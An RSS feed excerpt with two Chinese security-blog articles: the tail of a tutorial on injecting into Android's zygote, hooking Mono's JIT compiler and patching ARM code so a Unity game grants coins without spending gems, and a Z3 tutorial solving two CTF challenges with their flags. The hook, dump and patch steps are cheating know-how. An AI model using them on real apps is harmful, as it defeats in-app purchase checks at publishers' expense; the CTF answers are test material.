libinject2&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/qq1084283172/article/details/53869796&quot;&gt;Android进程的so注入--Poison（稳定注入版） - 水汐。2014 的专栏 - CSDN博客&lt;/a&gt; Poison注入框架&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在完成注入之后，我们的功能代码即可在目标进程中执行，接下来需要在目标进程中执行 hook 过程。通过 hook 技术，可以截断一个函数的执行流程并插入自定义的代码。针对 zygote 注入，这个问题稍微复杂。因为在我们注入 zygote 的时机，游戏进程还没有启动，因此无法直接 hook 到目标函数。后面将会介绍到，我们的目标函数是 native 层的 c 函数。因为 zygote 进程最后会 fork 成游戏进程，为了感知游戏进程中目标函数的加载，可以监控该函数所在的库的加载，那么就需要用到 linker 中的 dlopen 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void *dlopen(const char *filename, int flags);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 hook dlopen 函数并检查 filename 参数确定目标库的加载，随后再一次进行实际的功能性 hook ，hook 目标函数达到修改目的。也就是说，通过 zygote hook 的方式 hook 一个目标函数，需要进行两次 hook ，第一次是 hook linker 中的 dlopen 以确定目标模块的基址，第二次是在该模块中 hook 目标函数。这里有一个小问题是由于 dlopen 函数在每一个 zygote 的子进程中都会被 hook ，导致系统性能下降，一个解决方案是定期查看&lt;b&gt; /proc/pid/cmdline&lt;/b&gt; 如果自身不是目标进程那么就解除 hook 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;针对 Unity 游戏的 hook 思路大体如上，本节的最后再讲讲关于使用的 hook 框架。Hook 操作的原理可以理解为强行修改程序的代码段，通过修改目标地址上的字节码为 B ，JMP 等指令将指令流跳转到 hook 者控制的位置执行另一段指令。当然实际实现中复杂性远远大于这句描述，因为指令执行完毕之后通常需要返回到 hook 前的位置，如何保证 hook 点处指令、寄存器值等各种信息完好，是需要很大工作量的。Java 层的 hook 框架可以使用 XScript 、frida 、cydia substrate 等等，native 层笔者尝试过的有效工具有 cydia substrate和android-inline-hook ( &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt; )。ARM 平台上的 hook 工具开发有几个坑点，一个原因是由于 ARM 有大量位置相关代码，如果 hook 点在这种指令上，那么想要在异地恢复这条指令相当困难；另一个原因是 ARM 上存在 Thumb 指令集，需要考虑判断当前指令集并执行不同的操作。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了注入和 hook 两种工具，就可以完成对目标函数的运行时修改。下一节探讨针对 Unity 游戏，具体修改哪些函数可以完成对游戏逻辑的控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  Mono加载C#字节码过程分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;  可能很多人都像我一样好奇过，Android 是一个类 Java 虚拟机部署在 Linux 平台上，怎么就跑起来了微软的 C# ？其实 C# 已经被 ECMA 组织标准化（虽然这组织和微软渊源颇深），并且标准基础上出现了一套运行时（ Common Language Runtime , CLR ）。这套运行时的具体实现是一个叫做 mono 的开源项目。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本节介绍 mono 执行 C# 字节码的过程。Android 上的 Unity 正是通过 mono 的 Just-in-time Compile 机制完成了从 C# 语言世界到 ARM 机器码世界的转化。接下来对 Mono 项目的源码中对 DLL 处理的逻辑做一个分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，mono 加载 DLL 文件之后，会进行预编译，首先调用 &lt;b&gt;/mono/mini/mini.c&lt;/b&gt; 中的 mono_precompile_assemblies 函数，该函数对所有需要加载的 assembly 文件逐个调用 mono_precompile_assembly 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void mono_precompile_assemblies ()
{
	GHashTable *assemblies = g_hash_table_new (NULL, NULL);

	mono_assembly_foreach ((GFunc)mono_precompile_assembly, assemblies);

	g_hash_table_destroy (assemblies);
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static void
mono_precompile_assembly (MonoAssembly *ass, void *user_data)
{
	...
	for (i = 0; i &amp;lt; mono_image_get_table_rows (image, MONO_TABLE_METHOD); ++i) {
		method = mono_get_method (image, MONO_TOKEN_METHOD_DEF | (i + 1), NULL);
		mono_compile_method (method);
		if (strcmp (method-&amp;gt;name, &quot;Finalize&quot;) == 0) {
			invoke = mono_marshal_get_runtime_invoke (method, FALSE);
			mono_compile_method (invoke);
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里摘取了 mono_precompile_assembly 函数的关键步骤。该函数中针对当前需要处理的的 assembly ，对其中每一个函数调用 mono_compile_method 进行编译，同时编译 invoke 。这个 invoke 是对应函数的一个包装器，当  mono最终调用函数时，会通过包装器调用而不是直接调用。因此在函数 compile 完成之后，会生成并编译 invoke 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来分析的关键是 mono_compile_method 函数，真正的编译过程发生在这个函数中。该函数不是唯一的，因为 mono 同时支持 AOT（ ahead of time ）编译，未来也可能添加其他功能。因此这个函数这里为一个函数指针，在 JIT 编译环境下执行的是 mono_jit_compile_method 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gpointer
mono_jit_compile_method (MonoMethod *method)
{
	MonoException *ex = NULL;
	gpointer code;

	code = mono_jit_compile_method_with_opt (method, mono_get_optimizations_for_method (method, default_opt), &amp;amp;ex);
	if (!code) {
		g_assert (ex);
		mono_raise_exception (ex);
	}

	return code;
}
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个函数调用了 mono_jit_compile_method_with_opt 函数做具体操作，注意这里返回的是 gpointer 指针，其实这个指针指向的就是 DLL 脚本最终编译成汇编所在的地址，后续如果我们需要修改生成的汇编代码，修改这个指针即可。接下来我们稍微深入跟进一些。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static gpointer
mono_jit_compile_method_with_opt (MonoMethod *method, guint32 opt, MonoException **ex)
{
	...
    target_domain = mono_get_root_domain ();
	info = lookup_method (target_domain, method); //先查表判断是否已经编译
	if (info) {
		/* We can&#39;t use a domain specific method in another domain */
		if (! ((domain != target_domain) &amp;amp;&amp;amp; !info-&amp;gt;domain_neutral)) {
			MonoVTable *vtable;
			MonoException *tmpEx;

			mono_jit_stats.methods_lookups++;
			vtable = mono_class_vtable (domain, method-&amp;gt;klass);
			g_assert (vtable);
			tmpEx = mono_runtime_class_init_full (vtable, ex == NULL);
			if (tmpEx) {
				*ex = tmpEx;
				return NULL;
			}
			return mono_create_ftnptr (target_domain, info-&amp;gt;code_start);
		}
	}

	code = mono_jit_compile_method_inner (method, target_domain, opt, ex);//实际编译点
	···
	p = mono_create_ftnptr (target_domain, code);
    ···
	return p;
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里隐去了编译 invoke 函数的代码和一些细枝末节的 check 。可以看到， mono_jit_compile_method_with_opt 函数的主要流程是首先查表看当前要编译的函数是否已经编译，如果已经编译，则直接返回编译好的结果；否则，调用 mono_jit_compile_method_inner 函数实际编译并注册到 target_domain 中，随后通过 mono_create_ftnptr 函数获取函数指针。因为这部分代码是复用的，除了首次加载 DLL 之外的一些情景也会调用该函数，其中存在一些函数已经编译的情况。 mono_jit_compile_method_inner 函数以下是一些与机器相关的具体机器码生成过程，对虚拟机感兴趣的朋友可以进一步学习，这里就不继续深究了，简单把整个调用过程整理一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;graph TD;
start--&amp;gt;mono_precompile_assemblies
mono_precompile_assemblies--&amp;gt;|foreach|mono_precompile_assembly
mono_precompile_assembly--&amp;gt;|函数体|mono_jit_compile_method
mono_precompile_assembly--&amp;gt;|invoke|mono_marshal_get_runtime_invoke
mono_marshal_get_runtime_invoke--&amp;gt;mono_jit_compile_method
mono_jit_compile_method--&amp;gt;mono_jit_compile_method_with_opt
mono_jit_compile_method_with_opt--&amp;gt;|已经编译过|mono_create_ftnptr
mono_jit_compile_method_with_opt--&amp;gt;|没有编译过|mono_jit_compile_method_inner
mono_jit_compile_method_inner--&amp;gt;mini_method_compile
mini_method_compile--&amp;gt;mono_codegen
mono_codegen--&amp;gt;mono_create_ftnptr
mono_create_ftnptr--&amp;gt;finish&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;至此我们的分析完成了，尽管虚拟机可以使用花样繁多的语言开发，但是最终在执行前一需要恢复成本地机器码去执行。这就给了我们下 hook 的机会，下一节介绍通过修改 mono 编译出来的汇编函数逻辑，完成对游戏流程的动态修改。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X03  通过修改虚拟机生成的汇编指令修改游戏逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来我们尝试利用前面两节介绍的知识，修改游戏的执行逻辑.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void MainButtonClicked()
{
	...
		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们选择 MainButtonClicked 这个函数作为目标，其中的购买金币分支会检测当前钻石数量，如果数量够则进行购买，否则不进行购买。在 mono_jit_compile_method_with_opt 函数上下钩子，检查第一个参数 method 的 name 字段是否包含“ MainButtonClicked ”，在包含这个字段时，将 gpointer 指向的函数 dump 出来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;	if(!strstr(name, &quot;MainButtonClicked&quot;)) return target(arg1, arg2, arg3);
	LOGE(&quot;find MainButtonClicked&quot;);
	void* funcptr = target(arg1, arg2, arg3);
	LOGE(&quot;function MainButtonClicked base is: %0lx&quot;, funcptr);
	int fd = open(&quot;/data/local/tmp/dump&quot;, O_WRONLY | O_CREAT);
	if(fd == -1){
		LOGE(&quot;open error: %s&quot;, strerror(errno));
		exit(-1);
	}
	if(write(fd, funcptr, 0x1000 * 0x1000) == -1){
		LOGE(&quot;write error: %s&quot;, strerror(errno));
		exit(-1);
	}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如上述代码所示，这次 hook 在 mono_jit_compile_method_with_opt 函数每次编译 C# 函数点进行判断，当被编译的函数是我们的目标 MainButtonClicked 时，对内存进行 dump ，将编译成机器码的 MainButtonClicked 输出出来，接下来，使用 IDA 对该函数进行分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在加载该函数时需要注意，由于 dump 出来的是部分内存，不像标准的 elf 文件一样有各种配置能够加载，识别为 binary file ，需要手动指定处理器架构，这里是 ARM 。另外需要指定硬盘文件偏移和程序在内存中偏移的映射关系，注意上边代码中第四行输出了程序在内存中的地址，IDA 能够利用 file_offset+memory_base 计算出相当一部分的跳转指令的跳转地址（当然，由于我们只 dump 了很小一部分内存，仍然有很多依赖相对偏移寻址的跳转目标无法恢复，但对程序结构的分析无太大影响）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 IDA 加载后，可以看出函数明显是一个 switch-case 结构：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-18af552a8585f0802182b8d233b5501a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;726&quot; data-rawheight=&quot;485&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个结构与 MainButtonClicked 函数原始形式一致，通过分析二者关系可以定位到金币购买时点击确定按键对应到的 case ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cdc0d4b206e0401f62255f720f602fe9_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;途中的两个分支就是 C# 中的 if-else 。由于高级语言数据结构比较复杂，反应在机器码层面取数据涉及问题较多，因此修改取数据比较困难。但是可以看到，上面的 block 中 R5 是最后取出的当前剩余宝石，当与其进行比较之后，如果宝石充足，则会跳转到红色分支开始购买，增加金币扣除宝石。因此应当修改的逻辑是图中 1 处，通过 nop（mov r0, r0）掉跳转强制执行购买流程。为了在修改金币的同时不减少宝石，将2处宝石运算改为 add r0 , r0 , r5 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;确定了修改点之后将上述两条命令汇编，使用之前的 hook 稍作修改，当执行到 MainButtonClicked 编译时修改程序机器码（ mono 已经很贴心的 mprotect 过了），完成对游戏的修改，接下来尝试购买宝石，哇，奇迹发生了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X04  后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文从一个简单小游戏的破解出发，介绍了 Unity3D 引擎使用 mono 进行 C# JIT 编译的思路，并设计了实验性质的 hook 方案。其实针对这款简单的小游戏，更简单的破解方式还有很多种，牛刀杀鸡是为了以后更容易杀牛。因为在实际的环境中，分析游戏面临着过反调试、脱壳、对抗去符号、DLL 解密等多重挑战。限于篇幅不可能对这些技术一一介绍，感兴趣的朋友可以自行百度/谷歌。另外，由于使用了 AOT 机制，文章中介绍的 hook 思路可能会更适用于 iOS ，条件所限没有尝试。攻击是为了更好的防御，使用的实例，介绍的工具都为了更好的说明技术本身，请不要用违法的目的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考文献&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;[1]: &lt;a href=&quot;http://www.cnblogs.com/murongxiaopifu/p/4211964.html&quot;&gt;Mono为何能跨平台？聊聊CIL(MSIL) - 慕容小匹夫 - 博客园&lt;/a&gt;	&quot;Mono为何能跨平台？聊聊CIL(MSIL)&quot;&lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;http://www.ecma-international.org/&quot;&gt;Welcome to Ecma International&lt;/a&gt;	&quot;EMCA官网&quot;&lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt;	&quot;Android Inline Hook&quot;&lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/mono/mono&quot;&gt;mono/mono&lt;/a&gt;	&quot;Mono Project on Github&quot;&lt;/p&gt;&lt;p&gt;[5]: &lt;a href=&quot;https://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt;	&quot;古河大大libinject&quot;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-07-30703785</guid>
<pubDate>Tue, 07 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Z3一把梭：用约束求解搞定一类CTF题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-29-30548907.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30548907&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ab18970a5c5801d979023ff5ef808f23_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Z3 简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3&quot;&gt;Z3&lt;/a&gt; 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用，本文以近期的 CTF 题为实例，向尚未接触过约束求解器的小伙伴们介绍 Z3 在 CTF 解题中的应用。&lt;/p&gt;&lt;p&gt;Z3 约束求解器是针对 &lt;a href=&quot;https://en.wikipedia.org/wiki/Satisfiability_modulo_theories&quot;&gt;Satisfiability modulo theories Problem&lt;/a&gt; 的一种通用求解器。所谓 SMT 问题，在 Z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 Z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 Z3 想象得过于万能。&lt;/p&gt;&lt;p&gt;Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 &lt;a href=&quot;http://angr.io/&quot;&gt;angr&lt;/a&gt; 也内置了一个修改版的 Z3。&lt;/p&gt;&lt;p&gt;Z3 本身提供一个类似于 Lisp 的内置语言，但是实际使用中，一般使用 Python Binding 操作会比较方便。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/namespacez3py.html&quot;&gt;http://z3prover.github.io/api/html/namespacez3py.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://pypi.python.org/pypi/z3-solver/4.5.1.0&quot;&gt;https://pypi.python.org/pypi/z3-solver/4.5.1.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&quot;&gt;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Z3 入门&lt;/h2&gt;&lt;p&gt;Z3 内置了多种变量类型，基本能覆盖常见计算机数据结构。包括整数、浮点数、BitVector、数组等。&lt;/p&gt;&lt;p&gt;先来一个简单的例子看一下 Z3 能做什么：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;from z3 import *

x = Int(&#39;x&#39;)
y = Int(&#39;y&#39;)
solve(x &amp;gt; 2, y &amp;lt; 10, x + 2*y == 7) &lt;/code&gt;&lt;p&gt;上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。&lt;/p&gt;&lt;p&gt;然后就调用了 &lt;code class=&quot;inline&quot;&gt;solve&lt;/code&gt; 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。&lt;/p&gt;&lt;p&gt;运行一下结果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ python example.py 
[y = 0, x = 7] &lt;/code&gt;&lt;p&gt;可以看出，Z3 找到了 y=0，x=7 这组解。细心的小伙伴会发现，x=5,y=1 也符合条件，为什么没有体现？原因在于 Z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。&lt;/p&gt;&lt;p&gt;好了，经过上面的简单介绍相信大家都对 Z3 有一个基本的认识，下面看看在 CTF 实际应用。&lt;/p&gt;&lt;h2&gt;Z3 实战样题一：DEFCAMP 2017 Misc 题 forgot my key&lt;/h2&gt;&lt;p&gt;题目如下：&lt;/p&gt;&lt;p&gt;I forgot my flag &amp;amp; key. Help me recover them.&lt;/p&gt;&lt;p&gt;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function my_encrypt($flag, $key) {
  $key = md5($key);
  $message = $flag . &quot;|&quot; . $key;

  $encrypted = chr(rand(0, 126));
  for($i=0;$i&amp;lt;strlen($message);$i++) {
    $encrypted .= chr((ord($message[$i]) + ord($key[$i % strlen($key)]) + ord($encrypted[$i])) % 126);
  }
  $hexstr = unpack(&#39;h*&#39;, $encrypted);
  return array_shift($hexstr);
}
&lt;/code&gt;&lt;p&gt;这题给了一个加密函数，要求还原 flag 和 key。观察可以发现，加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。&lt;/li&gt;&lt;li&gt;第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;思路是有了，然而写起来未必简单，因为人的思维都是正向的，逆向求解特别是还要写出完整求解代码总是麻烦的。&lt;/p&gt;&lt;p&gt;于是我们考虑是否可以使用 Z3 来求解。首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑。其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来。如此分析应该 Z3 一把梭问题不大。&lt;/p&gt;&lt;p&gt;代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python3

from z3 import *
import binascii

s = &#39;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#39;

encrypted = []
for i in range(0, len(s), 2):
    encrypted.append(binascii.unhexlify(s[i+1] + s[i])[0])

print(&#39;message len:&#39;, len(encrypted)-1)
print(encrypted)
# 声明变量，encrypted 是已知，因此 IntVal 即可
encrypted = [IntVal(i) for i in encrypted]
message = [Int(&#39;flag%d&#39; % i) for i in range(len(encrypted)-1)]
# 创建一个求解器，求解全靠它
solver = Solver()

ml = len(encrypted) - 1

# 添加明文字符的约束条件
for i in range(ml):
    if i == ml - 33:
        solver.add(message[i] == ord(&#39;|&#39;))
    else:
        # 肯定是可见字符，因此限定范围如下
        solver.add(message[i] &amp;lt; 127)
        solver.add(message[i] &amp;gt;= 32)
# 添加明文和密文对照关系的约束条件
for i in range(ml):
    solver.add(encrypted[i+1] == (message[i] + message[ml-32+i%32] + encrypted[i]) % 126)

if solver.check() == sat:
    m = solver.model()
    s = []
    for i in range(ml):
        s.append(m[message[i]].as_long())
    print(bytes(s))
else:
    print(&#39;unsat&#39;) &lt;/code&gt;&lt;p&gt;运行求解：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python solve.py 
message len: 103
b&#39;DCTF{0d940de38493d96dc6255cbb2c2ac7a2db1a7792c74859e95215caa6b57c69b2}|6941f4cac9b7784fdd77e11b51cd0d64&#39;

real	0m7.277s
user	0m7.260s
sys	0m0.010s &lt;/code&gt;&lt;p&gt;在我的 Mac 上总共耗时 7s。从这个 &lt;a href=&quot;http://solve.py/&quot;&gt;solve.py&lt;/a&gt; 可以看出，由于使用了 Z3，求解整个题目所需要做的事情基本就是照着原来的逻辑照抄翻译一遍，再添加其他细节（如可见字符范围在32到127之间），然后求解，就大功告成了！&lt;/p&gt;&lt;h2&gt;z3 实战样题二：CSAW 2017 逆向题 realism&lt;/h2&gt;&lt;p&gt;前面是一道简单的 misc/crypto 题目，这里再展示 Z3 在一道逆向题的应用。 realism 是一个主要针对 x86 &lt;a href=&quot;https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions&quot;&gt;SSE 指令&lt;/a&gt; 的逆向题目。题目可以从 &lt;a href=&quot;https://github.com/youben11/CSAW_2017_quals_rev400&quot;&gt;https://github.com/youben11/CSAW_2017_quals_rev400&lt;/a&gt; 获取。&lt;/p&gt;&lt;p&gt;题目的主要逻辑其实并不长，但是由于应用了 SSE 指令，且同样是一番循环逻辑运算之后，要求运算结果与某个预设值相等，逆向起来有一定复杂度。关键逻辑如下图：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b294784dcae9d6b0bcee51759487f3c_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2032&quot; data-rawheight=&quot;927&quot;&gt;&lt;p&gt;把逻辑整理成伪代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;xmm5 = results[0]

for i in range(8, 0, -1):
    xmm2 = andps(flag, bytes(masks[i:i+8]))
    xmm5 = psadbw(xmm5, xmm2)
    assert xmm5 == results[9-i] &lt;/code&gt;&lt;p&gt;同样的，如果要根据结果逆推，首先需要理解清楚每一个指令的精确含义，然后需要做大量的逆推工作。因此考虑是否可以用 Z3 从正向思维来解决这类问题。&lt;/p&gt;&lt;p&gt;这里的难点在于要准确模拟 andps 和 psadbw 两个指令的行为。此外，需要选择正确的 BitVector 大小。因为 8 位会导致 psadbw 加法溢出得到错误的值，因此这里统一使用 16 位。&lt;/p&gt;&lt;p&gt;程序如下： &lt;a href=&quot;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&quot;&gt;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&lt;/a&gt;&lt;/p&gt;&lt;p&gt;运行我们的程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python3 solve.py 
b&#39;flag{4r3alz_m0d3_y0}&#39;

real	0m0.788s
user	0m0.790s
sys	0m0.000s &lt;/code&gt;&lt;p&gt;仅需 0.8s 即可解出结果。&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;合理使用 Z3 可以在许多场景下根据约束自动帮助我们求解，只需要根据正向思路使用 Z3 表达原有逻辑即可，大大减少我们分析和逆推的时间。当然，Z3 的功能远不止这些，这里只是介绍了最简单的入门应用，有兴趣的小伙伴可以通过阅读文档资料进一步了解。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3&quot;&gt;https://rise4fun.com/z3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3/wiki/Slides&quot;&gt;https://github.com/Z3Prover/z3/wiki/Slides&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/index.html&quot;&gt;http://z3prover.github.io/api/html/index.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&quot;&gt;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3/tutorialcontent/guide&quot;&gt;Z3 - Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(长亭技术专栏原创文章，转载请注明来源)&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-29-30548907</guid>
<pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才</title>
